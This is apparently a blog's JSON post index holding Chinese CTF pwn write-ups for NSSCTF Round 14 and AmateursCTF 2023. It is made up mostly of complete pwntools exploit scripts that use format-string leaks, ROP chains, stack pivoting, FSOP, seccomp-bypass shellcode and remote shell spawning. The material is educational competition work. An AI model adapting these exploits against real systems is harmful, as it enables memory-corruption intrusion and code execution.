[
  
  {
    "title": "NSSCTF-Round-14-Basic",
    "url": "/posts/NSSCTF-Round-14-Basic/",
    "categories": "CTF",
    "tags": "CTF",
    "date": "2023-07-30 00:00:00 +0800",
    





    
    "snippet": "‍‍​‍  5 道pwn 题‍love存在 格式化字符串漏洞​​‍然后进入 vuln 函数，然后直接溢出,由于上面需要的libc_base Canary 都已经有了，可以直接 return system(“/bin/sh”);​​  exploit 非预期from pwn import *s       = lambda data               :io.send(data)sa...",
    "content": "‍‍​‍  5 道pwn 题‍love存在 格式化字符串漏洞​​‍然后进入 vuln 函数，然后直接溢出,由于上面需要的libc_base Canary 都已经有了，可以直接 return system(“/bin/sh”);​​  exploit 非预期from pwn import *s       = lambda data               :io.send(data)sa      = lambda delim,data         :io.sendafter(str(delim), data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(str(delim), data)r       = lambda num                :io.recv(num)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)itr     = lambda                    :io.interactive()uu32    = lambda data               :u32(data.ljust(4,b'\\x00'))uu64    = lambda data               :u64(data.ljust(8,b'\\x00'))ls      = lambda data               :log.success(data)context.arch      = 'amd64'context.log_level = 'debug'context.terminal  = ['tmux','splitw','-h','-l','130']def start(binary,argv=[], *a, **kw):    '''Start the exploit against the target.'''    if args.GDB:        return gdb.debug([binary] + argv, gdbscript=gdbscript, *a, **kw)    else:        return process([binary] + argv, *a, **kw)gdbscript = '''b *0x40131Bcontinue'''.format(**locals())binary = './pwn'libelf = './libc.so.6'if (binary!=''): elf  = ELF(binary) ; rop=ROP(binary)if (libelf!=''): libc = ELF(libelf)io = start(binary)io = remote('node4.anna.nssctf.cn',28753)#09:0048│     0x7ffc410fe908 ◂— 0x10140a8aa00b1300#0b:0058│     0x7ffe19b67ea8 —▸ 0x7ff05691e083 (__libc_start_main+243) ◂— mov edi, eaxpay = f'%520c%9$hn%{0x9+0x6}$p%{0x0b+0x6}$p'ru('Toka\\n\\n')#gdb.attach(io)sl(pay)ru('0x')cann = int(r(16),16)__libc_start_main = int(r(14),16)libc_base = __libc_start_main - 243 - libc.sym['__libc_start_main']system = libc_base + libc.sym['system']bin_sh = libc_base + next(libc.search(b'/bin/sh'))ls(hex(cann))ls(hex(libc_base))ru('level\\n\\n')pay = 0x28 * b\"A\" + p64(cann)*2 + p64(rop.find_gadget(['ret'])[0])*1 + p64(rop.find_gadget(['pop rdi','ret'])[0]) + p64(bin_sh) + p64(system) + p64(elf.sym['main'])sl(pay)io.interactive()  预期解法​​from ctypes import *from struct import packbanary = \"./love\"elf = ELF(banary)#libc = ELF(\"./libc.so.6\")libc=ELF(\"/lib/x86_64-linux-gnu/libc.so.6\")ip = '127.0.0.1'port = 10005local = 1if local:    io = process(banary)else:    io = remote(ip, port)context(log_level = 'debug', os = 'linux', arch = 'amd64')#context(log_level = 'debug', os = 'linux', arch = 'i386')def dbg():    gdb.attach(io)    pause()s = lambda data : io.send(data)sl = lambda data : io.sendline(data)sa = lambda text, data : io.sendafter(text, data)sla = lambda text, data : io.sendlineafter(text, data)r = lambda : io.recv()ru = lambda text : io.recvuntil(text)uu32 = lambda : u32(io.recvuntil(b\"\\xff\")[-4:].ljust(4, b'\\x00'))uu64 = lambda : u64(io.recvuntil(b\"\\x7f\")[-6:].ljust(8, b\"\\x00\"))iuu32 = lambda : int(io.recv(10),16)iuu64 = lambda : int(io.recv(6),16)uheap = lambda : u64(io.recv(6).ljust(8,b'\\x00'))lg = lambda addr : log.info(addr)ia = lambda : io.interactive()pop_rdi=0x00000000004013f3puts_plt=elf.plt['puts']puts_got=elf.got['puts']ret=0x000000000040101a#gdb.attach(io,'b *0x000000000040125D')ru(\"I want to hear your praise of Toka\\n\")payload='%'+str(520)+'c'+'%9$hhn'sl(payload)#pause()payload=b'A'*0x28+p64(0xdeadbeef)+b'A'*8+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(elf.sym['vuln'])payload=payload.ljust(0x868,b'\\x00')+p64(0xdeadbeef)*3#payload=b'A'*8ru(\"I know you like him, but you must pass my level\\n\")sl(payload)libcbase=uu64()-libc.sym['puts']lg(\"libcbase:\"+hex(libcbase))system=libcbase+libc.sym['system']bin_sh=libcbase+next(libc.search(b'/bin/sh\\x00'))onegadget=libcbase+0xe3b01ru(\"I know you like him, but you must pass my level\\n\")payload=b'A'*0x28+p64(0xdeadbeef)+b'A'*8+p64(onegadget)sl(payload)ia()‍rbp‍ORW  拿flag‍​​只能溢出 覆盖一个 ret ,需要利用栈迁移​​控制 下一次 rbp 为bss上，然后再次read​​然后写 rop 到 bss 上都会栈迁移也到这里​​​​然后再 leave ret 栈迁移 泄露 libc上的地址‍​​puts 结束后 我们再 返回到 vuln​​​​​​‍  exploitfrom pwn import *s       = lambda data               :io.send(data)sa      = lambda delim,data         :io.sendafter(str(delim), data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(str(delim), data)r       = lambda num                :io.recv(num)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)itr     = lambda                    :io.interactive()uu32    = lambda data               :u32(data.ljust(4,b'\\x00'))uu64    = lambda data               :u64(data.ljust(8,b'\\x00'))ls      = lambda data               :log.success(data)context.arch      = 'amd64'context.log_level = 'debug'context.terminal  = ['tmux','splitw','-h','-l','130']def start(binary,argv=[], *a, **kw):    '''Start the exploit against the target.'''    if args.GDB:        return gdb.debug([binary] + argv, gdbscript=gdbscript, *a, **kw)    else:        return process([binary] + argv, *a, **kw)gdbscript = '''b *0x0x404410continue'''.format(**locals())binary = './rbp'libelf = '/opt/pwn/glibc-all-in-one/libs/2.31-0ubuntu9.9_amd64/libc.so.6'if (binary!=''): elf  = ELF(binary) ; rop=ROP(binary)if (libelf!=''): libc = ELF(libelf)io = start(binary)#io = remote('node2.anna.nssctf.cn',28345)bss = 0x404800leave = 0x4012bfpay = b'A' *0x0210 + p64(bss) + p64(0x401292)gdb.attach(io)s(pay)pause()pay = p64(rop.find_gadget(['pop rdi','ret'])[0]) + p64(elf.got['puts']) + p64(elf.sym['puts']) +p64(0x0401270) # vulnpay = pay.ljust(0x0210,b'A')pay += p64(bss-0x218) + p64(leave)s(pay)ru('\\x40\\x0a')x = uu64(r(6))libc_base = x - libc.sym['puts']system = libc_base + libc.sym['system']bin_sh = libc_base + next(libc.search(b'/bin/sh'))ls(hex(libc_base))libc_file = '/opt/pwn/glibc-all-in-one/libs/2.31-0ubuntu9.9_amd64/libc.so.6'libc_file = '/opt/pwn/glibc-all-in-one/libs/2.31-0ubuntu9.9_amd64/libc.so.6'libc_rop = ROP(libc_file)def f(Str):    return libc_base + libc_rop.find_gadget([Str,'ret'])[0]syscall_ret = f('syscall')pop_rax = f('pop rax')pop_rdi = f('pop rdi')pop_rsi = f('pop rsi')pop_rbx = f('pop rbx')pop_adb   = libc_base +  0x0000000000090528 # pop rax ; pop rdx ; pop rbx ; retpop_adb   = libc_base +  0x000000000015f8c5 # pop rax ; pop rdx ; pop rbx ; retpop_adb   = libc_base +  0x000000000015f8c5 # pop rax ; pop rdx ; pop rbx ; retshellcode = shellcraft.open('/flag')shellcode += shellcraft.read('rax','rsp',100)shellcode += shellcraft.write(1,'rsp',100)shellcode = asm(shellcode)orw_rop = flat(        pop_rdi, bss-0x800,     # rdi addr        pop_rsi, 0x1000, # rsi length        pop_adb, 0,7,0,  # rdx per         libc_base + libc.sym['mprotect'], # 修改 权限        0x404448, # 此时栈已经 rwx了 所以直接返回到栈上执行代码        '\\x90'*0x20,        shellcode         )pay =  orw_roppay = pay.ljust(0x0210,b'B')#x = bss - 0x404610#exe = 0x4045f0-0x1f0#pay += p64(bss-0x1f8) + p64(leave)#pay += p64(bss-0x1f8) + p64(leave)pay += p64(0x4043f0) + p64(leave)pause()s(pay)io.interactive()第一次栈迁移泄露 libc第二次 利用 mprotect 修改 bss 权限 为 rwx ,顺便把 orw shllcode 写到bss上，然后 ret2 shellcode‍xor‍​​​​​​      第一次修改 flag的 高位 为 0xff 也就成负数了,然后就可以一直不退出程序        然后把shellcode 写到 bss 上，    程序退出时会执行 __do_global_dtors_aux_fini_array_entry​ ,相当于got  我们把shellcode 的地址写进去，就可以执行了​__libc_csu_init​ -&gt; lea rbp, __do_global_dtors_aux_fini_array_entry​‍​​  二次读 shellcode​​  exploitfrom pwn import *s       = lambda data               :io.send(data)sa      = lambda delim,data         :io.sendafter(str(delim), data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(str(delim), data)r       = lambda num                :io.recv(num)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)itr     = lambda                    :io.interactive()uu32    = lambda data               :u32(data.ljust(4,b'\\x00'))uu64    = lambda data               :u64(data.ljust(8,b'\\x00'))ls      = lambda data               :log.success(data)context.arch      = 'amd64'context.log_level = 'debug'context.terminal  = ['tmux','splitw','-h','-l','130']def start(binary,argv=[], *a, **kw):    '''Start the exploit against the target.'''    if args.GDB:        return gdb.debug([binary] + argv, gdbscript=gdbscript, *a, **kw)    else:        return process([binary] + argv, *a, **kw)gdbscript = '''b *0x004006FEcontinue'''.format(**locals())binary = './pwn'libelf = ''if (binary!=''): elf  = ELF(binary) ; rop=ROP(binary)if (libelf!=''): libc = ELF(libelf)io = start(binary)#io = remote('node1.anna.nssctf.cn',28651)#sc = asm(shellcraft.sh())sc = '''xor eax,eaxxor edi,edipush 0x78pop rdxpush 0x600958pop rsisyscall'''sc = asm(sc)print(len(sc))print(disasm(sc))pause()def w(add,vul):    ru('addr: ')    sl(hex(add))    ru('value: ')    sl('0x' + hex(vul)[2:].rjust(2,'0'))# 改 flag 高位，这样 flag就是负数了w(0x0600BCC+3,0x100-0x10)#gdb.attach(io)# 把 read 的shellcode 写到 bss上read = 0x600958for i in range(0,len(sc)):    p1 = u8(sc[i:i+1])    add = (0x600958 + i)    w(add ,p1)sc = p32(0x400610)for i in range(0,len(sc)):    p1 = u8(sc[i:i+1])    add = 0x600970 + i    w(add ,p1)sc = p32(read)for i in range(0,len(sc)):    p1 = u8(sc[i:i+1])    add = 0x600970 + i    w(add ,p1)#gdb.attach(io,'b *0x400610')# exitw(0x0600BCC+3,0x100-0x10)pause()pay = 0x16 * b'\\x90'pay += asm(shellcraft.sh())sl(pay)io.interactive()‍read_filefrom pwn import *s       = lambda data               :io.send(data)sa      = lambda delim,data         :io.sendafter(str(delim), data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(str(delim), data)r       = lambda num                :io.recv(num)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)itr     = lambda                    :io.interactive()uu32    = lambda data               :u32(data.ljust(4,b'\\x00'))uu64    = lambda data               :u64(data.ljust(8,b'\\x00'))ls      = lambda data               :log.success(data)context.arch      = 'amd64'context.log_level = 'debug'context.terminal  = ['tmux','splitw','-h','-l','130']def start(binary,argv=[], *a, **kw):    '''Start the exploit against the target.'''    if args.GDB:        return gdb.debug([binary] + argv, gdbscript=gdbscript, *a, **kw)    else:        return process([binary] + argv, *a, **kw)gdbscript = '''b *0x0401478continue'''.format(**locals())binary = './pwn'libelf = ''if (binary!=''): elf  = ELF(binary) ;if (libelf!=''): libc = ELF(libelf)io = start(binary)#io = remote('node5.anna.nssctf.cn',28140)def load_file(name):    ru('&gt;&gt; ')    sl('1')    ru(' : ')    s(name)load_file('dev/null')load_file('flag\\x00fla')ru('&gt;&gt; ')sl('2')ru(' : ')sl('55')#gdb.attach(io)rop=ROP(binary)pay = b'A' * 55 + b'BBBBBBBBCCCCCCCCD'pay += p64(0x401493) + p64(0x0401615) * 2 # 巧妙sl(pay)Girlfriends’ notebooks‍from pwn import *s       = lambda data               :io.send(data)sa      = lambda delim,data         :io.sendafter(str(delim), data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(str(delim), data)r       = lambda num                :io.recv(num)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)itr     = lambda                    :io.interactive()uu32    = lambda data               :u32(data.ljust(4,b'\\x00'))uu64    = lambda data               :u64(data.ljust(8,b'\\x00'))ls      = lambda data               :log.success(data)context.arch      = 'amd64'context.log_level = 'debug'context.terminal  = ['tmux','splitw','-h','-l','130']def start(binary,argv=[], *a, **kw):    '''Start the exploit against the target.'''    if args.GDB:        return gdb.debug([binary] + argv, gdbscript=gdbscript, *a, **kw)    else:        return process([binary] + argv, *a, **kw)gdbscript = '''continue'''.format(**locals())binary = './pwn'libelf = '/opt/pwn/glibc-all-in-one/libs/2.35-0ubuntu3.1_amd64/libc.so.6'if (binary!=''): elf  = ELF(binary) ; rop=ROP(binary)if (libelf!=''): libc = ELF(libelf)def add(idx,size,text):    ru('choice: ')    sl('1')    ru(\"idx: \")    sl(str(idx))    ru('size: ')    sl(str(size))    ru('content: ')    s(text)def show(idx):    ru('choice: ')    sl('2')    ru(\"idx: \")    sl(str(idx))def edit(idx,text):    ru('choice: ')    sl('4')    ru(\"idx: \")    sl(str(idx))    ru(\"content: \")    sl(text)io = start(binary)#io = remote()add(0,0x48,b'a'*0x58+p64(0x1001))#add(0,0x48,b'a'*0x50)add(1,0x2000,b'wsnd')gdb.attach(io)pause()add(4,0x200,'B'*8)show(4)ru('B'*8)main_arena = uu64(r(6))ls(hex(main_arena))libc_base = main_arena - 2204400__free_hook = libc_base + libc.sym['__free_hook']system = libc_base + libc.sym['system']log.success(hex(main_arena))log.success(hex(libc_base))io_file = FileStructure()libc.address = libc_baserop  = ROP(libc)pop_rbp_addr = rop.find_gadget([\"pop rbp\",\"ret\"])[0]leave_ret_addr = rop.find_gadget([\"leave\",\"ret\"])[0]standard_FILE_addr = libc.sym['_IO_2_1_stdout_']_IO_wfile_jumps_addr = libc.sym[\"_IO_wfile_jumps\"]fake_rbp_addr = libc.address+0x21a860-8 # libc.address+0x21a860-8 开始写 rop 链io_file.flags = 0 io_file._IO_read_ptr = pop_rbp_addrio_file._IO_read_end = fake_rbp_addrio_file._IO_read_base = leave_ret_addrio_file._IO_write_base = 0io_file._IO_write_ptr = 1io_file.unknown2 |= (0 &lt;&lt; 192)io_file._lock = standard_FILE_addr-0x10io_file.chain = leave_ret_addrio_file._codecvt = standard_FILE_addrio_file._wide_data = standard_FILE_addr - 0x48io_file.vtable = _IO_wfile_jumps_addrrdi = rop.find_gadget([\"pop rdi\",\"ret\"])[0]rsi = rop.find_gadget([\"pop rsi\",\"ret\"])[0]rdx= rop.find_gadget([\"pop rdx\",\"pop r12\",\"ret\"])[0]open_ = libc.sym['open']read_= libc.sym['read']puts = libc.sym['puts']write_ = libc.sym['write']flag = libc.address+0x21a908payload = bytes(io_file)payload += p64(rdi)+p64(flag)+p64(rsi)+p64(0)+p64(open_)payload += p64(rdi)+p64(3)+p64(rsi)+p64(libc.address+0x21af00)+p64(rdx)+p64(0xff)+p64(0)+p64(read_)payload += p64(rdi)+p64(1)+p64(rsi)+p64(libc.address+0x21af00)+p64(rdx)+p64(0xff)+p64(0)+p64(write_)payload += b\"/flag\\x00\"ls(hex(fake_rbp_addr))edit(-8,payload)io.interactive()"
  },
  
  {
    "title": "2023-AmateursCTF-WriteUps",
    "url": "/posts/AmateursCTF/",
    "categories": "CTF",
    "tags": "CTF",
    "date": "2023-07-19 20:55:00 +0800",
    





    
    "snippet": "https://ctf.amateurs.team/1.pwn-rntk  代码恢复  程序自己生产里一个类似 canary 的东西，溢出检测#include&lt;stdio.h&gt;#include&lt;string.h&gt;#include&lt;stdlib.h&gt;#include &lt;time.h&gt;long long int global_canary=NULL...",
    "content": "https://ctf.amateurs.team/1.pwn-rntk  代码恢复  程序自己生产里一个类似 canary 的东西，溢出检测#include&lt;stdio.h&gt;#include&lt;string.h&gt;#include&lt;stdlib.h&gt;#include &lt;time.h&gt;long long int global_canary=NULL;int win(){  char s[72]; // [rsp+0h] [rbp-50h] BYREF  FILE *stream; // [rsp+48h] [rbp-8h]  stream = fopen(\"flag.txt\", \"r\");  if ( !stream )  {    puts(\"flag file not found\");    exit(1);  }  fgets(s, 64, stream);  return puts(s);}int random_guess(){  char nptr[40]; // [rsp+0h] [rbp-30h] BYREF  int v2; // [rsp+28h] [rbp-8h]  int v3; // [rsp+2Ch] [rbp-4h]  printf(\"Enter in a number as your guess: \");  v3 = global_canary;  gets(nptr);  v2 = strtol(nptr, 0LL, 10);  if ( v3 != global_canary ) // 溢出检测  {    puts(\"***** Stack Smashing Detected ***** : Canary Value Corrupt!\");    exit(1);  }  if ( v2 == rand() )    return puts(\"Congrats you guessed correctly!\");  else    return puts(\"Better luck next time\");}int generate_canary(){  unsigned int v0; // eax  int result; // eax  v0 = time(0LL);  srand(v0);  result = rand();  global_canary = result;  return result;}int  main(){  unsigned int v3; // eax  int v4; // [rsp+Ch] [rbp-4h] BYREF  setbuf(stdout, 0LL);  setbuf(stderr, 0LL);  generate_canary();  while ( 1 )  {    puts(\"Please select one of the following actions\");    puts(\"1) Generate random number\");    puts(\"2) Try to guess a random number\");    puts(\"3) Exit\");    v4 = 0;    scanf(\"%d\", &amp;v4);    getchar();    if ( v4 == 3 )      break;    if ( v4 &lt;= 3 )    {      if ( v4 == 1 )      {        v3 = rand();        printf(\"%d\\n\", v3);      }      else if ( v4 == 2 )      {        random_guess();      }    }  }  exit(0);}// gcc main.c -fno-stack-protector  使用time 预测计算 伪随机，进行预测canary的值然后覆盖 returnfrom pwn import *s       = lambda data               :io.send(data)sa      = lambda delim,data         :io.sendafter(str(delim), data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(str(delim), data)r       = lambda num                :io.recv(num)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)itr     = lambda                    :io.interactive()uu32    = lambda data               :u32(data.ljust(4,b'\\x00'))uu64    = lambda data               :u64(data.ljust(8,b'\\x00'))ls      = lambda data               :log.success(data)binary = './chal'libelf = ''context.arch      = 'amd64'context.log_level = 'debug'context.terminal  = ['tmux','splitw','-h','-l','130']io = process(binary)io = remote('amt.rs',31175)win = 0x04012BAfrom ctypes import *import timecli = cdll.LoadLibrary('/lib/x86_64-linux-gnu/libc.so.6')cli.srand(int(time.time()))v3 = cli.rand()print(v3)ru('3) Exit\\n')#gdb.attach(io)sl('2')ru(': ')pay = (44) * b'A' + p32(v3) + p64(0) + p64(win)sl(pay)io.interactive()# amateursCTF{r4nd0m_n0t_s0_r4nd0m_after_all}2.pwn-permissions      源码          沙箱 只允许 read write exit      #include &lt;sys/mman.h&gt;#include &lt;fcntl.h&gt;#include &lt;unistd.h&gt;#include &lt;linux/seccomp.h&gt;#include &lt;seccomp.h&gt;#include &lt;err.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;void setup_seccomp () {    scmp_filter_ctx ctx;    ctx = seccomp_init(SCMP_ACT_KILL);    int ret = 0;    ret |= seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), 0);    ret |= seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), 0);    ret |= seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit), 0);    ret |= seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit_group), 0);    ret |= seccomp_load(ctx);    if (ret) {        errx(1, \"seccomp failed\");    }}int main () {    setbuf(stdout, NULL);    setbuf(stderr, NULL);    alarm(6);    int fd = open(\"flag.txt\", O_RDONLY);    if (0 &gt; fd)        errx(1, \"failed to open flag.txt\");    char * flag = mmap(NULL, 0x1000, PROT_WRITE, MAP_ANON | MAP_PRIVATE, -1, 0);    if (flag == MAP_FAILED)        errx(1, \"failed to mmap memory\");    if (0 &gt; read(fd, flag, 0x1000))        errx(1, \"failed to read flag\");    close(fd);    // make flag write-only    if (0 &gt; mprotect(flag, 0x1000, PROT_WRITE))        errx(1, \"failed to change mmap permissions\");    char * code = mmap(NULL, 0x100000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_ANON | MAP_PRIVATE, -1, 0);    if (code == MAP_FAILED)        errx(1, \"failed to mmap shellcode buffer\");    printf(\"&gt; \");    if (0 &gt; read(0, code, 0x100000))        errx(1, \"failed to read shellcode\");    setup_seccomp();    ((void(*)(char *))code)(flag);    exit(0);}  程序沙箱=[06:06:12]-➤  seccomp-tools dump ./chal&gt; 1 line  CODE  JT   JF      K================================= 0000: 0x20 0x00 0x00 0x00000004  A = arch 0001: 0x15 0x00 0x08 0xc000003e  if (A != ARCH_X86_64) goto 0010 0002: 0x20 0x00 0x00 0x00000000  A = sys_number 0003: 0x35 0x00 0x01 0x40000000  if (A &lt; 0x40000000) goto 0005 0004: 0x15 0x00 0x05 0xffffffff  if (A != 0xffffffff) goto 0010 0005: 0x15 0x03 0x00 0x00000000  if (A == read) goto 0009 0006: 0x15 0x02 0x00 0x00000001  if (A == write) goto 0009 0007: 0x15 0x01 0x00 0x0000003c  if (A == exit) goto 0009 0008: 0x15 0x00 0x01 0x000000e7  if (A != exit_group) goto 0010 0009: 0x06 0x00 0x00 0x7fff0000  return ALLOW 0010: 0x06 0x00 0x00 0x00000000  return KILL  exploitfrom pwn import *s       = lambda data               :io.send(data)sa      = lambda delim,data         :io.sendafter(str(delim), data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(str(delim), data)r       = lambda num                :io.recv(num)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)itr     = lambda                    :io.interactive()uu32    = lambda data               :u32(data.ljust(4,b'\\x00'))uu64    = lambda data               :u64(data.ljust(8,b'\\x00'))ls      = lambda data               :log.success(data)binary = './chal'libelf = ''context.arch      = 'amd64'context.log_level = 'debug'context.terminal  = ['tmux','splitw','-h','-l','130']io = process(binary)io = remote('amt.rs',31174)pay = asm('''    xchg rax,rsi    push 1    pop rax    push 1    pop rdi    push 50    pop rdx    syscall        ''')#gdb.attach(io,'b *$rebase(0x01553)')sl(pay)io.interactive()# amateursCTF{exec_1mpl13s_r34d_8751fda0}  SYS_write_ 输出flag​​‍‍3.pwn-hex-converter-1  源码#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main(){    setbuf(stdout, NULL);    setbuf(stderr, NULL);    int i = 0;    char name[16];    printf(\"input text to convert to hex: \\n\");    gets(name);    char flag[64];    fgets(flag, 64, fopen(\"flag.txt\", \"r\"));    // TODO: PRINT FLAG for cool people ... but maybe later    while (i &lt; 16)    {        // the &amp; 0xFF... is to do some typecasting and make sure only two characters are printed ^_^ hehe        printf(\"%02X\", (unsigned int)(name[i] &amp; 0xFF));        i++;    }    printf(\"\\n\");}利用溢出覆盖  v7 的值为负数，然后就可以printf flag_data 了​​  exploitfrom pwn import *s       = lambda data               :io.send(data)sa      = lambda delim,data         :io.sendafter(str(delim), data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(str(delim), data)r       = lambda num                :io.recv(num)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)itr     = lambda                    :io.interactive()uu32    = lambda data               :u32(data.ljust(4,b'\\x00'))uu64    = lambda data               :u64(data.ljust(8,b'\\x00'))ls      = lambda data               :log.success(data)binary = './chal'libelf = ''lcontext.arch      = 'amd64'context.log_level = 'debug'context.terminal  = ['tmux','splitw','-h','-l','130']#elf =  ELF(binary)#libc = ELF(libelf)io = process(binary)io = remote('amt.rs',31630)ru('input text to convert to hex: \\n')pay = b'A' * (28) +  p64(0x100000000 + (-64))#gdb.attach(io)sl(pay)x = io.recvline()[:-1]print(bytes.fromhex(x.decode()))io.interactive()‍4.pwn-hex-converter-2  源码#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main(){    setbuf(stdout, NULL);    setbuf(stderr, NULL);    int i = 0;    char name[16];    printf(\"input text to convert to hex: \\n\");    gets(name);    char flag[64];    fgets(flag, 64, fopen(\"flag.txt\", \"r\"));    // TODO: PRINT FLAG for cool people ... but maybe later    while (1)    {        // the &amp; 0xFF... is to do some typecasting and make sure only two characters are printed ^_^ hehe        printf(\"%02X\", (unsigned int)(name[i] &amp; 0xFF));        // exit out of the loop        if (i &lt;= 0)        {            printf(\"\\n\");            return 0;        }        i--;    }}‍IDA 打开如果把 v7 覆盖成 负数，确实可以 泄露 flag,但是只能泄露一个，我们可以写个循环来一个一个字符泄露flag​​‍  exploitfrom pwn import *s       = lambda data               :io.send(data)sa      = lambda delim,data         :io.sendafter(str(delim), data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(str(delim), data)r       = lambda num                :io.recv(num)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)itr     = lambda                    :io.interactive()uu32    = lambda data               :u32(data.ljust(4,b'\\x00'))uu64    = lambda data               :u64(data.ljust(8,b'\\x00'))ls      = lambda data               :log.success(data)binary = './chal'libelf = ''context.arch      = 'amd64'context.log_level = 'debug'context.terminal  = ['tmux','splitw','-h','-l','130']#elf =  ELF(binary)#libc = ELF(libelf)flag = ''for i in range(140):    #io = process(binary)    io = remote('amt.rs',31631)    ru('input text to convert to hex: \\n')    pay = b'A' * (28) +  p64(0x100000000 + (-64)+i)    sl(pay)    flag += chr(int(io.recv(2),16))    print(flag)    io.close()#x = io.recvline()[:-1]#print(bytes.fromhex(x.decode()))#io.interactive(‍​​amateursCTF{an0ther_e4sier_0ne_t0_offset_unvariant_while_l00p}‍5.pwn-i-love-ffi  源码#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;stdint.h&gt;#include &lt;stddef.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/mman.h&gt;struct MmapArgs {    uint64_t * addr;    uint64_t length;    int protection;    int flags;    int fd;    uint64_t offset;};extern struct MmapArgs mmap_args();int main () {    setbuf(stdout, NULL);    setbuf(stderr, NULL);    struct MmapArgs args = mmap_args();    char * buf = mmap(args.addr, args.length, args.protection, MAP_PRIVATE | MAP_ANON, args.fd, args.offset);    if (buf &lt; 0) {        perror(\"failed to mmap\");    }    read(0, buf, 0x1000);    printf(\"&gt; \");    int op;    if (scanf(\"%d\", &amp;op) == 1) {        switch (op) {            case 0:                ((void (*)(void))buf)();                break;            case 1:                puts(buf);                break;        }    }}‍‍DIA 打开 自定义libc 函数 mmap_args​​‍自定义libc​​​​看下实际给谁赋的值​​​​        addr: 0x0  # rdi        len: 0x190 # rsi        prot: 0x7  # rdx        flags: 0x21 # r10        fd: 0xffffffff # r8        offset: 0x0 # r9‍from pwn import *s       = lambda data               :io.send(data)sa      = lambda delim,data         :io.sendafter(str(delim), data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(str(delim), data)r       = lambda num                :io.recv(num)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)itr     = lambda                    :io.interactive()uu32    = lambda data               :u32(data.ljust(4,b'\\x00'))uu64    = lambda data               :u64(data.ljust(8,b'\\x00'))ls      = lambda data               :log.success(data)binary = './chal'libelf = ''context.arch      = 'amd64'context.log_level = 'debug'context.terminal  = ['tmux','splitw','-h','-l','130']#elf =  ELF(binary)#libc = ELF(libelf)io = process(binary)#io = remote()addr = 0x30000Len = 0x1000fd =  0offset = 0prot = 7sla(\"&gt;\",str(addr))sla(\"&gt;\",str(Len))sla(\"&gt;\",str(fd))sla(\"&gt;\",'0')sla(\"&gt;\",str(offset))gdb.attach(io)sla(\"&gt;\",str(prot))io.interactive()‍​​mmap 申请的 0x3000​​‍然后下面就是读一段shellcode,直接发送过去，然后 去执行‍‍​​  exploitfrom pwn import *s       = lambda data               :io.send(data)sa      = lambda delim,data         :io.sendafter(str(delim), data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(str(delim), data)r       = lambda num                :io.recv(num)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)itr     = lambda                    :io.interactive()uu32    = lambda data               :u32(data.ljust(4,b'\\x00'))uu64    = lambda data               :u64(data.ljust(8,b'\\x00'))ls      = lambda data               :log.success(data)binary = './chal'libelf = ''context.arch      = 'amd64'context.log_level = 'debug'context.terminal  = ['tmux','splitw','-h','-l','130']#elf =  ELF(binary)#libc = ELF(libelf)io = process(binary)io = remote('amt.rs',31172)addr = 0x30000Len = 0x1000fd =  0offset = 0prot = 7sla(\"&gt;\",str(addr))sla(\"&gt;\",str(Len))sla(\"&gt;\",str(fd))sla(\"&gt;\",'0')sla(\"&gt;\",str(offset))sla(\"&gt;\",str(prot))shellcode = asm(shellcraft.sh())sl(shellcode)#gdb.attach(io)sla(\"&gt;\",'0')io.interactive()# amateursCTF{1_l0v3_struct_p4dding}‍6.pwn-ELFcrafting-v1  源码#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;#include&lt;time.h&gt;int main(int argc, const char **argv, const char **envp){    int fd; // [rsp+28h] [rbp-38h]    int v6; // [rsp+2Ch] [rbp-34h]    int v7; // [rsp+2Ch] [rbp-34h]    char buf[40]; // [rsp+30h] [rbp-30h] BYREF    setbuf(stdout, 0LL);    setbuf(stderr, 0LL);    puts(\"I'm sure you all enjoy doing shellcode golf problems.\");    puts(\"But have you ever tried ELF golfing?\");    puts(\"Have fun!\");    fd = memfd_create(\"golf\", 0LL);    if ( fd &lt; 0 )    {        perror(\"failed to execute fd = memfd_create(\\\"golf\\\", 0)\");        exit(1);    }    v6 = read(0, buf, 0x20uLL);    if ( v6 &lt; 0 )    {        perror(\"failed to execute ok = read(0, buffer, 32)\");        exit(1);    }    printf(\"read %d bytes from stdin\\n\", v6);    v7 = write(fd, buf, v6);    if ( v7 &lt; 0 )    {        perror(\"failed to execute ok = write(fd, buffer, ok)\");        exit(1);    }    printf(\"wrote %d bytes to file\\n\", v7);    if ( fexecve(fd, argv, envp) &lt; 0 )    {        perror(\"failed to execute fexecve(fd, argv, envp)\");        exit(1);    }    return 